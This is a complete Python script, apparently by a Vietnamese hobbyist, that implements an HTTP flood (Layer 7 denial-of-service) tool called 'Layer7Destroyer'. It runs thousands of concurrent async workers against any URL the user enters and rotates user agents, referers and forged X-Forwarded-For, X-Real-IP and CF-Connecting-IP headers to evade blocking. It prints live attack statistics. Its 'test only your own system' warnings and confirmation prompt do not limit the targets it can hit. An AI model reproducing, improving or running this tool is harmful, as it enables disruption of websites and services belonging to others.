#!/usr/bin/env python3
"""
Minh Khang Trùm Hủy Diệt Layer 7 Wifi 😆
HTTP Flood với Spoofing cực mạnh - CHỈ TEST MẠNG CỦA BẠN!
"""

import asyncio
import aiohttp
import random
import socket
import struct
import time
import sys
import os
from datetime import datetime
import ipaddress
import ssl
import signal
from typing import Optional

class Layer7Destroyer:
    def __init__(self, target_url: str, threads: int = 2000, duration: int = 60):
        self.target_url = target_url
        self.threads = min(threads, 5000)  # Giới hạn max 5000 threads
        self.duration = duration
        self.requests_sent = 0
        self.success_count = 0
        self.blocked_count = 0
        self.timeout_count = 0
        self.running = False
        self.start_time: Optional[float] = None
        self.session: Optional[aiohttp.ClientSession] = None
        
        # Tách host và port từ URL
        try:
            if '://' in target_url:
                self.target_host = target_url.split('//')[-1].split('/')[0].split(':')[0]
            else:
                self.target_host = target_url.split('/')[0].split(':')[0]
        except:
            self.target_host = target_url
        
        # SPOOFING DATABASE MẠNH MẼ
        self.user_agents = self.load_user_agents()
        self.referers = self.load_referers()
        self.accept_languages = ['en-US,en;q=0.9', 'vi,en;q=0.8', 'fr,en;q=0.7', 'es,en;q=0.6']
        
        # Header spoofing templates
        self.header_templates = self.create_header_templates()
        
        # SSL context cho HTTPS
        self.ssl_context = ssl.create_default_context()
        self.ssl_context.check_hostname = False
        self.ssl_context.verify_mode = ssl.CERT_NONE
        
        print(f"""
\033[91m
╔══════════════════════════════════════════════════════════════╗
║        MINH KHANG TRÙM HỦY DIỆT LAYER 7 WIFI 😆           ║
║          HTTP FLOOD WITH ULTRA SPOOFING                     ║
║        CHỈ TEST TRÊN HỆ THỐNG CỦA CHÍNH BẠN!               ║
╚══════════════════════════════════════════════════════════════╝
\033[0m
        """)
    
    def load_user_agents(self) -> list:
        """Danh sách User-Agent khổng lồ"""
        return [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 13_5) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/120.0',
            'Mozilla/5.0 (iPhone; CPU iPhone OS 16_6) AppleWebKit/605.1.15 Version/16.5 Mobile/15E148 Safari/604.1',
            'Mozilla/5.0 (Linux; Android 13; SM-S918B) AppleWebKit/537.36 Chrome/120.0.0.0 Mobile Safari/537.36',
            'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)',
            'facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Edge/120.0.0.0 Safari/537.36',
        ]
    
    def load_referers(self) -> list:
        """Danh sách Referer giả mạo"""
        return [
            'https://www.google.com/search?q=',
            'https://www.youtube.com/watch?v=',
            'https://www.facebook.com/',
            'https://twitter.com/home',
            'https://www.amazon.com/',
            'https://www.bing.com/search?q=',
            'https://www.baidu.com/s?wd=',
        ]
    
    def create_header_templates(self) -> list:
        """Tạo các template header để spoofing"""
        return [
            {
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
                'Accept-Encoding': 'gzip, deflate, br',
                'Accept-Language': 'en-US,en;q=0.5',
                'Connection': 'keep-alive',
                'Upgrade-Insecure-Requests': '1',
                'Cache-Control': 'max-age=0',
            },
            {
                'Accept': 'application/json, text/javascript, */*; q=0.01',
                'Accept-Encoding': 'gzip, deflate',
                'Accept-Language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
                'Connection': 'keep-alive',
                'X-Requested-With': 'XMLHttpRequest',
                'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
            },
        ]
    
    def generate_spoofed_headers(self) -> dict:
        """Tạo headers giả mạo hoàn chỉnh"""
        template = random.choice(self.header_templates)
        headers = template.copy()
        
        headers['User-Agent'] = random.choice(self.user_agents)
        
        if random.random() > 0.3:
            headers['Referer'] = random.choice(self.referers) + str(random.randint(1000, 9999))
        
        # SPOOFING: Fake IP headers
        spoof_headers = [
            ('X-Forwarded-For', self.generate_fake_ip()),
            ('X-Real-IP', self.generate_fake_ip()),
            ('CF-Connecting-IP', self.generate_fake_ip()),
        ]
        
        for _ in range(random.randint(1, 2)):
            header_name, header_value = random.choice(spoof_headers)
            headers[header_name] = header_value
        
        # Additional headers
        if random.random() > 0.5:
            headers['Accept-Language'] = random.choice(self.accept_languages)
        
        headers['X-Timestamp'] = str(int(time.time() * 1000))
        
        return headers
    
    def generate_fake_ip(self) -> str:
        """Tạo IP fake ngẫu nhiên"""
        if random.choice([True, False]):
            return f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"
        else:
            return f"192.168.{random.randint(0,255)}.{random.randint(1,254)}"
    
    def generate_random_path(self) -> str:
        """Tạo đường dẫn ngẫu nhiên"""
        paths = [
            '/', '/index.html', '/home', '/api/v1/users',
            '/wp-admin/', '/admin/login', '/dashboard',
            '/api/data', '/search', '/test',
            f'/api/{random.randint(1000, 9999)}',
            f'/user/{random.randint(10000, 99999)}',
            f'/post/{random.randint(1, 1000)}',
        ]
        return random.choice(paths)
    
    def generate_payload(self) -> bytes:
        """Tạo payload ngẫu nhiên cho POST requests"""
        return f"username={os.urandom(6).hex()}&password={os.urandom(8).hex()}".encode()
    
    def print_attack_log(self, method: str, status: str, response_time: Optional[int] = None):
        """Hiển thị log tấn công"""
        timestamp = datetime.now().strftime("%H:%M:%S")
        
        if status == "200":
            color = "\033[92m"
            status_symbol = "✓"
        elif status in ["404", "403"]:
            color = "\033[93m"
            status_symbol = "⚠"
        elif status in ["500", "502", "503", "504"]:
            color = "\033[91m"
            status_symbol = "✗"
        elif status == "TIMEOUT":
            color = "\033[95m"
            status_symbol = "⌛"
        else:
            color = "\033[96m"
            status_symbol = "•"
        
        log_msg = f"{color}[{timestamp}] [{method}] {status} {status_symbol}"
        if response_time:
            log_msg += f" ({response_time}ms)"
        
        print(log_msg + "\033[0m", end="\r")
        sys.stdout.flush()
    
    async def http_flood_worker(self, worker_id: int):
        """Worker chính cho HTTP Flood"""
        while self.running and self.session:
            try:
                method = "GET" if random.random() > 0.2 else "POST"
                path = self.generate_random_path()
                url = f"{self.target_url.rstrip('/')}{path}"
                headers = self.generate_spoofed_headers()
                
                data = None
                if method == "POST":
                    data = self.generate_payload()
                    headers['Content-Length'] = str(len(data))
                
                if method == "GET" and random.random() > 0.5:
                    url += f"?_={int(time.time() * 1000)}"
                
                start_time = time.time()
                async with self.session.request(
                    method=method,
                    url=url,
                    headers=headers,
                    data=data,
                    timeout=aiohttp.ClientTimeout(total=3, connect=2),
                    ssl=self.ssl_context if 'https://' in self.target_url else False
                ) as response:
                    
                    response_time = int((time.time() - start_time) * 1000)
                    self.requests_sent += 1
                    status = str(response.status)
                    
                    if status == "200":
                        self.success_count += 1
                    elif status in ["503", "502", "429", "403"]:
                        self.blocked_count += 1
                    
                    self.print_attack_log(method, status, response_time)
                
                await asyncio.sleep(random.uniform(0.001, 0.02))
                
            except asyncio.TimeoutError:
                self.requests_sent += 1
                self.timeout_count += 1
                self.print_attack_log("GET", "TIMEOUT")
            except Exception:
                self.requests_sent += 1
                # Bỏ qua lỗi để tăng tốc độ
    
    async def display_real_time_stats(self):
        """Hiển thị thống kê real-time"""
        while self.running:
            if self.start_time:
                elapsed = time.time() - self.start_time
                if elapsed > 0:
                    rps = self.requests_sent / elapsed
                    
                    stats = f"""
\033[95m╔══════════════════════════════════════════╗
║         THỐNG KÊ TẤN CÔNG                ║
╠══════════════════════════════════════════╣
║ Thời gian: {elapsed:5.1f}s / {self.duration}s     ║
║ Requests:  {self.requests_sent:8,}           ║
║ RPS:       {rps:8.1f}                     ║
║ Thành công: {self.success_count:8,}           ║
║ Bị block:  {self.blocked_count:8,}           ║
║ Timeout:   {self.timeout_count:8,}           ║
║ Threads:   {self.threads:8}               ║
╚══════════════════════════════════════════╝\033[0m
"""
                    sys.stdout.write("\033[F" * 11 + stats)
                    sys.stdout.flush()
            
            await asyncio.sleep(0.5)
    
    async def start_attack(self):
        """Bắt đầu tấn công"""
        print(f"\n\033[93m[+] TARGET: {self.target_url}")
        print(f"[+] THREADS: {self.threads}")
        print(f"[+] DURATION: {self.duration}s")
        print(f"[+] START TIME: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\033[0m\n")
        
        # Cấu hình connector
        connector = aiohttp.TCPConnector(
            limit=0,
            limit_per_host=0,
            ttl_dns_cache=300,
            force_close=True,
            enable_cleanup_closed=True
        )
        
        async with aiohttp.ClientSession(
            connector=connector,
            timeout=aiohttp.ClientTimeout(total=5)
        ) as session:
            
            self.session = session
            self.running = True
            self.start_time = time.time()
            
            # Tạo các worker tasks
            tasks = []
            for i in range(self.threads):
                task = asyncio.create_task(self.http_flood_worker(i))
                tasks.append(task)
            
            # Task hiển thị thống kê
            stats_task = asyncio.create_task(self.display_real_time_stats())
            
            # Chạy trong thời gian chỉ định
            try:
                await asyncio.sleep(self.duration)
            except asyncio.CancelledError:
                pass
            finally:
                self.running = False
                
                # Dừng các task
                for task in tasks:
                    task.cancel()
                stats_task.cancel()
                
                # Đợi cleanup
                await asyncio.gather(*tasks, return_exceptions=True)
                await stats_task
            
            # Hiển thị kết quả cuối
            await self.display_final_stats()
    
    async def display_final_stats(self):
        """Hiển thị thống kê cuối cùng"""
        if self.start_time:
            elapsed = time.time() - self.start_time
            rps = self.requests_sent / elapsed if elapsed > 0 else 0
            
            print(f"""
\033[91m
╔══════════════════════════════════════════════════╗
║           KẾT QUẢ TẤN CÔNG CUỐI CÙNG            ║
╠══════════════════════════════════════════════════╣
║ Tổng thời gian:     {elapsed:.1f} giây               ║
║ Tổng requests:      {self.requests_sent:,}           ║
║ Requests/giây:      {rps:.1f} RPS                ║
║ Requests thành công: {self.success_count:,}           ║
║ Requests bị block:  {self.blocked_count:,}           ║
║ Requests timeout:   {self.timeout_count:,}           ║
║ Tỷ lệ thành công:   {(self.success_count/max(self.requests_sent,1)*100):.1f}%      ║
║ Target:             {self.target_host}            ║
╚══════════════════════════════════════════════════╝

🔥 TẤN CÔNG HOÀN TẤT! HỆ THỐNG ĐÃ ĐƯỢC TEST 🔥
\033[0m
""")

def show_banner():
    """Hiển thị banner"""
    print(r"""
\033[92m
███╗   ███╗██╗███╗   ██╗██╗  ██╗███╗   ██╗ ██████╗ 
████╗ ████║██║████╗  ██║██║  ██║████╗  ██║██╔════╝ 
██╔████╔██║██║██╔██╗ ██║███████║██╔██╗ ██║██║  ███╗
██║╚██╔╝██║██║██║╚██╗██║██╔══██║██║╚██╗██║██║   ██║
██║ ╚═╝ ██║██║██║ ╚████║██║  ██║██║ ╚████║╚██████╔╝
╚═╝     ╚═╝╚═╝╚═╝  ╚═══╝╚═╝  ╚═╝╚═╝  ╚═══╝ ╚═════╝ 
\033[91m
████████╗██████╗ ██╗   ██╗███╗   ███╗██╗  ██╗██╗   ██╗    ██╗   ██╗███████╗██████╗ 
╚══██╔══╝██╔══██╗██║   ██║████╗ ████║██║  ██║██║   ██║    ██║   ██║██╔════╝██╔══██╗
   ██║   ██████╔╝██║   ██║██╔████╔██║███████║██║   ██║    ██║   ██║█████╗  ██║  ██║
   ██║   ██╔══██╗██║   ██║██║╚██╔╝██║██╔══██║██║   ██║    ╚██╗ ██╔╝██╔══╝  ██║  ██║
   ██║   ██║  ██║╚██████╔╝██║ ╚═╝ ██║██║  ██║╚██████╔╝     ╚████╔╝ ███████╗██████╔╝
   ╚═╝   ╚═╝  ╚═╝ ╚═════╝ ╚═╝     ╚═╝╚═╝  ╚═╝ ╚═════╝       ╚═══╝  ╚══════╝╚═════╝ 
\033[93m
                        LAYER 7 DESTROYER 😆
\033[0m
""")

def signal_handler(signum, frame):
    """Xử lý signal để dừng chương trình đúng cách"""
    print("\n\033[91m[!] Nhận signal dừng... Đang cleanup\033[0m")
    sys.exit(0)

def main():
    """Hàm main chính"""
    # Đăng ký signal handler
    signal.signal(signal.SIGINT, signal_handler)
    signal.signal(signal.SIGTERM, signal_handler)
    
    show_banner()
    
    print("\n\033[91m" + "="*70)
    print("CẢNH BÁO: CHỈ ĐƯỢC SỬ DỤNG ĐỂ TEST HỆ THỐNG CỦA CHÍNH BẠN!")
    print("MỌI HÀNH VI SỬ DỤNG TRÁI PHÉP ĐỀU BẤT HỢP PHÁP!")
    print("="*70 + "\033[0m\n")
    
    # Nhập thông tin target
    try:
        url = input("Nhập URL target (http/https): ").strip()
        if not url:
            print("\033[91m[!] URL không được để trống!\033[0m")
            sys.exit(1)
        
        if not url.startswith(('http://', 'https://')):
            url = 'http://' + url
        
        threads_input = input("Số threads (1-5000, mặc định: 1000): ").strip()
        threads = int(threads_input) if threads_input else 1000
        threads = max(1, min(threads, 5000))  # Giới hạn 1-5000
        
        duration_input = input("Thời gian tấn công (giây, mặc định: 30): ").strip()
        duration = int(duration_input) if duration_input else 30
        duration = max(1, min(duration, 3600))  # Giới hạn 1-3600 giây
        
        # Xác nhận
        print(f"\n\033[93m[!] XÁC NHẬN TẤN CÔNG:")
        print(f"    Target: {url}")
        print(f"    Threads: {threads}")
        print(f"    Thời gian: {duration} giây\033[0m")
        
        confirm = input("\nBạn có CHẮC CHẮN đây là hệ thống của bạn? (yes/NO): ").lower()
        if confirm != 'yes':
            print("\n\033[91m[!] Đã hủy!\033[0m")
            sys.exit(0)
        
        # Khởi tạo và chạy
        destroyer = Layer7Destroyer(url, threads, duration)
        
        # Tối ưu asyncio
        if sys.platform == 'win32':
            asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())
        
        # Chạy tấn công
        asyncio.run(destroyer.start_attack())
        
    except ValueError:
        print("\033[91m[!] Lỗi: Số threads hoặc thời gian không hợp lệ!\033[0m")
        sys.exit(1)
    except KeyboardInterrupt:
        print("\n\n\033[91m[!] Dừng bởi người dùng\033[0m")
        sys.exit(0)
    except Exception as e:
        print(f"\n\033[91m[!] Lỗi: {str(e)}\033[0m")
        sys.exit(1)

if __name__ == "__main__":
    # Kiểm tra dependencies
    try:
        import aiohttp
    except ImportError:
        print("\033[93m[!] Đang cài đặt aiohttp...\033[0m")
        import subprocess
        subprocess.check_call([sys.executable, "-m", "pip", "install", "aiohttp"])
        print("\033[92m[+] Cài đặt thành công!\033[0m")
    
    # Chạy chương trình
    main()
